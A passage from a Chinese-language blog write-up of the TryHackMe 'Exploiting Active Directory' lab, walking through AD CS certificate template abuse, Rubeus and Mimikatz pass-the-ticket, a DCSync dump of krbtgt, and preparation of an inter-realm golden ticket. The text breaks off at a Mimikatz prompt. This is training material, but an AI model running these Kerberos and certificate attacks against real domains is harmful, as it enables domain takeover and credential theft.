<p>由于 AD CS 是一项特权功能，因此它通常在选定的域控制器上运行。这意味着普通用户无法真正直接与服务交互。另一方面，组织往往太大，无法让管理员手动创建和分发每个证书。这就是证书模板的用武之地。AD CS 管理员可以创建多个模板，允许任何具有相关权限的用户自行请求证书。这些模板包含一些参数，说明哪个用户可以请求证书以及需要什么。 SpecterOps 发现这些参数的特定组合可能具有令人难以置信的毒性，并且会被滥用以进行权限升级和持久访问。</p>
<p>在我们深入探讨证书滥用之前，先介绍一些术语：</p>
<ul>
<li>PKI - 公钥基础设施是管理证书和公钥加密的系统</li>
<li>AD CS - Active Directory 证书服务是 Microsoft 的 PKI 实现，通常在域控制器上运行</li>
<li>CA - 证书颁发机构是颁发证书的 PKI</li>
<li>Certificate Template - 定义 CA 颁发证书的方式和时间的设置和策略的集合</li>
<li>CSR - 证书签名请求是发送到 CA 以请求签名证书的消息</li>
<li>EKU - 扩展/增强密钥用法是定义如何使用生成的证书的对象标识符</li>
</ul>
<p>查找易受攻击的证书模板<br>
为了找到有漏洞的模板，我们将使用Windows的内置工具certutil。使用 THMSERVER2 上的 RDP 访问，我们可以运行以下 Powershell 脚本来枚举证书：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615151213528.png" alt="image-20240615151213528"></p>
<p>这将提供所有配置模板的输出。我们还可以使用证书审核工具，例如 Ghostpack 的 PSPKIAudit。然而，手动方法使我们能够确保找到所有可能的错误配置。如果参数值组合变得有毒，则证书模板将被视为配置错误，从而允许请求者执行权限升级。在我们的例子中，我们正在寻找具有以下有毒参数组合的模板：</p>
<ul>
<li>Client Authentication - 证书可用于客户端身份验证。</li>
<li>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 证书模板允许我们指定主题备用名称 (SAN)。</li>
<li>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 证书将可以使用私钥导出。</li>
<li>Certificate Permissions - 我们拥有使用证书模板所需的权限。</li>
</ul>
<p>如果您有兴趣了解有关有毒参数组合的更多信息，请阅读 SpectreOps 的白皮书。由于这个房间的目的是获得更广泛的 AD 利用攻击知识，因此我们将指出 Template[32] 是易受攻击的模板。在此模板中，我们可以看到 THMSERVER2 的计算机帐户可以为模板发出 CSR，该 CSR 允许我们指定主题备用名称 (SAN) 并可用于客户端身份验证。</p>
<p>SpecterOps 提到了 AD CS 的八种常见安全错误配置，因此应该注意的是，仍然可以发现大量潜在的错误配置。</p>
<h2 id="利用证书模板">利用证书模板</h2>
<p>使用 THMSERVER2 上的 RDP 访问，我们现在将请求我们的证书。如果您使用 Remmina 并保存 RDP 连接的配置，请确保禁用受限管理模式。我们将使用 Microsoft 管理控制台 (MMC)：</p>
<ol>
<li>Click <strong>Start</strong>-&gt;<strong>run</strong></li>
<li>Type <strong>mmc</strong> and hit enter<br>
输入 mmc 并按 Enter 键</li>
<li>Click <strong>File</strong>-&gt;<strong>Add/Remove Snap-in…</strong><br>
单击文件-&gt;添加/删除管理单元…</li>
<li>Add the <strong>Certificates</strong> snap-in and make sure to select <strong>Computer Account</strong> and <strong>Local computer</strong> on the prompts.<br>
添加证书管理单元并确保在提示中选择计算机帐户和本地计算机。</li>
<li>Click <strong>OK</strong> 单击“确定”</li>
</ol>
<p>您现在应该看到证书管理单元：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615151836008.png" alt="image-20240615151836008"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615151853480.png" alt="image-20240615151853480"></p>
<p>我们将要求个人证书：</p>
<ol>
<li>Right Click on <strong>Personal</strong> and select <strong>All Tasks</strong>-&gt;<strong>Request New Certificate…</strong><br>
右键单击“个人”并选择“所有任务”-&gt;“请求新证书…”</li>
<li>Click <strong>Next</strong> twice to select the AD enrollment policy.<br>
单击“下一步”两次以选择 AD 注册策略。</li>
<li>You will see that we have one template that we can request, but first, we need to provide additional information.<br>
您将看到我们有一个可以请求的模板，但首先，我们需要提供其他信息。</li>
<li>Click on the <strong>More Information</strong> warning.<br>
单击“更多信息”警告。</li>
<li>Change the <strong>Subject name Type</strong> option to <strong>Common Name</strong> and provide any value, since it does not matter, and click <strong>Add</strong>.<br>
将主题名称类型选项更改为通用名称并提供任意值（因为这并不重要），然后单击添加。</li>
<li>Change the <strong>Alternative name Type</strong> option to <strong>User principal name</strong>.<br>
将备用名称类型选项更改为用户主体名称。</li>
<li>Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@za.tryhackme.loc and click <strong>Add.</strong><br>
提供您要模拟的用户的 UPN。最好是 DA 帐户，例如 Administrator@za.tryhackme.loc，然后单击“添加”。</li>
</ol>
<p>您的附加信息应如下所示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615152015562.png" alt="image-20240615152015562"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615152207879.png" alt="image-20240615152207879"></p>
<p>一旦您满意，请单击“应用”和“确定”。然后，选择证书并单击注册。您应该能够看到您的证书：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615152315383.png" alt="image-20240615152315383"></p>
<p>最后一步是使用私钥导出我们的证书：</p>
<ol>
<li>Right-click on the certificate and select <strong>All Tasks</strong>-&gt;<strong>Export…</strong><br>
右键单击证书并选择“所有任务”-&gt;“导出…”</li>
<li>Click <strong>Next</strong>, select <strong>Yes, export the private key</strong>, and click <strong>Next</strong>.<br>
单击“下一步”，选择“是，导出私钥”，然后单击“下一步”。</li>
<li>Click <strong>Next</strong>, then set a password for the certificate since the private key cannot be exported without a password.<br>
单击下一步，然后为证书设置密码，因为没有密码无法导出私钥。</li>
<li>Click <strong>Next</strong> and select a location to store the certificate.<br>
单击“下一步”并选择存储证书的位置。</li>
<li>Click <strong>Next</strong> and finally click <strong>Finish.</strong><br>
单击“下一步”，最后单击“完成”。</li>
</ol>
<p>我这里设置的密码为：123456</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615152505948.png" alt="image-20240615152505948"></p>
<h2 id="通过证书模拟用户">通过证书模拟用户</h2>
<p>现在我们终于可以模拟用户了。要执行此操作，需要执行两个步骤：</p>
<ul>
<li>使用证书请求 Kerberos 票证授予票证 (TGT)</li>
<li>将 Kerberos TGT 加载到您选择的黑客平台中</li>
</ul>
<p>第一步，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus</a>，<code>C:\Tools\</code> 目录中提供了已编译的版本。打开命令提示符窗口并导航到该目录。我们将使用以下命令来请求 TGT：</p>
<pre><code class="hljs scss">Rubeus<span class="hljs-selector-class">.exe</span> asktgt /user:Administrator /enctype:aes256 /certificate:C:\Users\christine.hall\Desktop\vuln.pfx /password:<span class="hljs-number">123456</span> /outfile:master.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">60.101</span>

C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Users\christine.hall\Desktop\vuln.pfx /password:password@<span class="hljs-number">123</span> /outfile:master.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">10.200</span>.<span class="hljs-number">60.101</span></code></pre>
<p>我们来分解一下参数：</p>
<ul>
<li>/user - 这指定我们将模拟的用户，并且必须与我们生成的证书的 UPN 相匹配</li>
<li>/enctype - 指定票证的加密类型。设置此项对于规避很重要，因为默认加密算法很弱，这会导致溢出警报</li>
<li>/certificate - 我们生成的证书的路径</li>
<li>/password - 我们的证书文件的密码</li>
<li>/outfile - TGT 将输出到的文件</li>
<li>/domain - 我们当前攻击的域的 FQDN</li>
<li>/dc - 我们请求 TGT 的域控制器的 IP。通常最好选择运行CA服务的DC</li>
</ul>
<p>执行命令后，我们应该会收到 TGT：</p>
<p>理想状态如下：</p>
<pre><code class="hljs scss">C:\THMTools&gt; .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:<span class="hljs-number">12.31</span>.<span class="hljs-number">1.101</span>
          ______        _
         (_____ \      | |
          _____) )_   _| |__  _____ _   _  ___
         |  __  /| | | |  _ \| ___ | | | |/___)
         | |  \ \| |_| | |_) ) ____| |_| |___ |
         |_|   |_|____/|____/|_____)____/(___/
       
         v2.<span class="hljs-number">0.0</span>
       
       [*] Action: Ask TGT
       
       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert
       [*] Building AS-REQ (w/ PKINIT preauth) for: <span class="hljs-string">'lunar.eruca.com\svc.gitlab'</span>
       [+] TGT request successful!
       [*] <span class="hljs-built_in">base64</span>(ticket.kirbi):
       
             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk
             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC
             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ
             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/
             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD
             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+<span class="hljs-number">7</span>DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr
             <span class="hljs-number">2</span>Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW
             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM
             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+<span class="hljs-number">0</span>qOZDtgaJZ/neRdRktYhTsGL39VHB5
             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/<span class="hljs-number">7</span>ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW
             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/<span class="hljs-number">6</span>NyLjiE9srbOt6hCLzUaOSMGH1Enf
             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF
             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/<span class="hljs-number">4</span>mEjbUN5qjNqejYdUb/b5xw
             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG
             CNdI1/lsICpS/jaK6NM/<span class="hljs-number">0</span>oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk
             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+
             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO
             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS
             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/<span class="hljs-number">2</span>r7ecyrVZIf2Qf0+ci9G
             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP
             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY
             <span class="hljs-number">5</span>K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO
             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3
             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D
             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=
       
         ServiceName              :  krbtgt/za.tryhackme.loc
         ServiceRealm             : ZA.TRYHACKME.LOC
         UserName                 : Adminsitrator
         UserRealm                : ZA.TRYHACKME.LOC
         StartTime                :  <span class="hljs-number">2</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         EndTime                  :  <span class="hljs-number">2</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> AM
         RenewTill                :  <span class="hljs-number">2</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2022</span> <span class="hljs-number">5</span>:<span class="hljs-number">54</span>:<span class="hljs-number">46</span> PM
         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
         KeyType                  :  aes256_cts_hmac_sha1
         <span class="hljs-built_in">Base64</span>(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=
         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</code></pre>
<p>但我这里报错如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615165458473.png" alt="image-20240615165458473"></p>
<p>搜了几篇文章，这里有文章是这样说的，如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615165430874.png" alt="image-20240615165430874"></p>
<p>因此，我严重怀疑，那些成功了的，修改了这个策略，导致我复现不成功，因此这里就只能直接cv了，看思路</p>
<p>现在我们可以使用 Mimikatz 加载 TGT 并向 THMDC 进行身份验证：</p>
<pre><code class="hljs scss">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
<span class="hljs-comment"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
<span class="hljs-comment">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # kerberos::ptt administrator.kirbi

* File: <span class="hljs-string">'administrator.kirbi'</span>: OK

mimikatz # exit
Bye!

C:\Tools&gt;dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\THMDC.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">24</span> AM               <span class="hljs-number">154</span> dns_entries.csv
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">53</span> PM           <span class="hljs-number">885</span>,<span class="hljs-number">468</span> MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">31</span> PM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">27</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">423</span> thm-network-setup-dc.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">13</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">22</span> AM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">12</span> PM    &lt;DIR&gt;          Windows
               <span class="hljs-number">7</span> <span class="hljs-built_in">File</span>(s)      <span class="hljs-number">2</span>,<span class="hljs-number">356</span>,<span class="hljs-number">811</span> bytes
               <span class="hljs-number">7</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">50</span>,<span class="hljs-number">914</span>,<span class="hljs-number">541</span>,<span class="hljs-number">568</span> bytes free</code></pre>
<p>最后，我们可以访问第 0 层基础设施，并破坏了整个子域！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615165803164.png" alt="image-20240615165803164"></p>
<h1 id="0x08-利用域信任">0x08 利用域信任</h1>
<p>尽管我们可以访问第 0 层基础设施，但这仍然不够。我们仅利用了 ZA.TRYHACKME.LOC 域。 TRYHACKME 肯定也必须有其他地区的域名吗？好吧，如果我们控制了根域 TRYHACKME.LOC，我们将能够危害所有这些区域域。在此任务中，我们将了解如何利用域信任来控制整个森林。</p>
<h2 id="域信任">域信任</h2>
<p>正如 <a target="_blank" rel="noopener" href="https://tryhackme.com/jr/activedirectorybasics">AD 基础知识室</a>中所讨论的，森林是 AD 网络内一棵或多棵域树的集合。域信任是网络中的用户访问域中其他资源的一种机制。在大多数情况下，信任概述了林内的域如何相互通信。在某些环境中，信任可以扩展到外部域，在某些情况下甚至可以扩展到林。</p>
<p>域之间可配置的信任主要有两种类型：</p>
<ul>
<li>Directional - 信任从信任域流向受信任域的方向</li>
<li>Transitive- 信任关系不仅仅限于两个域，还包括其他受信任的域</li>
</ul>
<p>林中通常有根域或父域。在我们的例子中，这是 TRYHACKME.LOC。对于每个区域办事处，都会创建子域，例如 ZA.TRYHACKME.LOC 或 UK.TRYHACKME.LOC。此林配置将允许 ZA 和英国办事处之间共享资源。例如，如果英国办公室的某个用户需要访问 THMSERVER1，我们可以为 ZA 域中的用户授予访问权限。这种权限委派之所以有效，是因为 ZA 和根域以及 UK 和根域之间存在双向信任，本质上是在 ZA 和 UK 之间创建传递信任。</p>
<p>如上所述，父域和子域之间的信任是双向的。这是预期的行为，用于通过更大的可传递信任关系来共享资源。然而，作为攻击者，如果我们已经破坏了子域，我们也可以利用这种信任来破坏父域。</p>
<h2 id="krbtgt-和-黄金票据">KRBTGT 和 黄金票据</h2>
<p>KRBTGT 是用于 Microsoft 实施 Kerberos 的帐户。该名称源自 Kerberos (KRB) 和票证授予票证 (TGT)。本质上，此帐户充当 Kerberos 分发中心 (KDC) 服务的服务帐户，该服务处理所有 Kerberos 票证请求。此帐户用于加密和签署域的所有 Kerberos 票证。由于密码哈希由所有域控制器共享，因此当用户请求访问资源时，它们可以验证收到的 TGT 的真实性。</p>
<p>但是，如果我们想生成自己的 TGT 来授予我们访问所有内容的权限，该怎么办？这称为金票攻击。在金票攻击中，我们完全绕过 KDC 并创建我们自己的 TGT，本质上成为票证授予服务器 (TGS)。为了伪造 TGT，我们需要以下信息：</p>
<ul>
<li>域的 FQDN</li>
<li>域的安全标识符 (SID)</li>
<li>我们要模拟的帐户的用户名</li>
<li>KRBTGT 密码哈希</li>
</ul>
<p>前三个通常很容易恢复。最后一个需要域妥协，因为 KRBTGT 密码哈希仅存储在域控制器上。幸运的是，我们刚刚使用伪造的证书破坏了第 0 层管理员组，因此我们能够恢复 KRBTGT 密码哈希。</p>
<p>我们将再次使用带有 DC Sync 的 Mimikatz 来恢复 THMSERVER2 上的 KRBTGT 密码哈希：</p>
<pre><code class="hljs scss">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
<span class="hljs-comment"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
<span class="hljs-comment">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # lsadump::dcsync /user:za\krbtgt
[DC] <span class="hljs-string">'za.tryhackme.loc'</span> will be the domain
[DC] <span class="hljs-string">'THMDC.za.tryhackme.loc'</span> will be the DC server
[DC] <span class="hljs-string">'za\krbtgt'</span> will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : <span class="hljs-number">30000000</span> ( USER_OBJECT )
User Account Control : <span class="hljs-number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">18</span>:<span class="hljs-number">22</span> PM
Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">502</span>
Object Relative ID   : <span class="hljs-number">502</span>

Credentials:
  Hash NTLM: removed
    ntlm- <span class="hljs-number">0</span>: removed
    lm  - <span class="hljs-number">0</span>: removed
[....]</code></pre>
<h2 id="跨领域-tgts">跨领域 TGTs</h2>
<p>使用 KRBTGT 密码哈希，我们现在可以伪造黄金票证来访问子域中的任何资源。这也将在持久 AD 室中进行更详细的讨论。然而，我们可以通过打造跨领域 TGT 来更进一步。领域间 TGT 用于提供对其他域中资源的访问。在我们的例子中，我们希望利用子域和父域之间的双向信任关系来获得对父域的完全访问权限。</p>
<p>当我们构建金票来执行此漏洞时，我们将包含来自其他域的额外帐户 SID。 Mimikatz 可以对此提供帮助，允许我们设置 Kerberos TGT 的 KERB_VALIDATION_INFO 结构的 ExtraSids 部分。 ExtraSids 部分被描述为“指向 KERB_SID_AND_ATTRIBUTES 结构列表的指针，该结构包含与主体所属帐户域以外的域中的组相对应的 SID 列表”。</p>
<p>这里的关键是，我们将通过将企业管理员 (EA) 组的 SID 作为额外的 SID 添加到我们为子域的域控制器伪造的票证中，来利用父域对子域的信任。 EA 组属于父域，并且该组的成员资格实质上授予对整个林的管理权限！该组的默认 SID 是 S-1-5-21-<rootdomain>-519。</rootdomain></p>
<p>在我们开始利用之前，我们首先需要恢复两个 SID：</p>
<ul>
<li>子域控制器 (THMDC) 的 SID，我们将在伪造的 TGT 中模拟它</li>
<li>父域中企业管理员的 SID，我们将其作为额外的 SID 添加到伪造的 TGT 中</li>
</ul>
<p>要恢复这些 SID，我们可以使用 AD-RSAT Powershell cmdlet。我们可以使用以下命令恢复子域控制器的SID：</p>
<pre><code class="hljs scss">PS C:\&gt; Get-ADComputer -Identity <span class="hljs-string">"THMDC"</span>

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-<span class="hljs-number">782</span>b-<span class="hljs-number">4</span>b09-<span class="hljs-number">93</span>b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1001</span>
UserPrincipalName :</code></pre>
<p>我们可以使用以下命令查询父域控制器来恢复 Enterprise Admins 组的 SID：</p>
<pre><code class="hljs scss">PS C:\&gt; Get-ADGroup -Identity <span class="hljs-string">"Enterprise Admins"</span> -Server thmrootdc.tryhackme.loc

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-<span class="hljs-number">16</span>e8-<span class="hljs-number">44</span>d5-<span class="hljs-number">9</span>b36-<span class="hljs-number">8173</span>c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3330634377</span>-removed-<span class="hljs-number">519</span></code></pre>
<h2 id="利用域信任">利用域信任</h2>
<p>我们终于拥有了创建伪造 TGT 所需的所有信息。我们将使用 Mimikatz 生成这张金票。该命令将如下所示：</p>
<pre><code class="hljs scss">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe

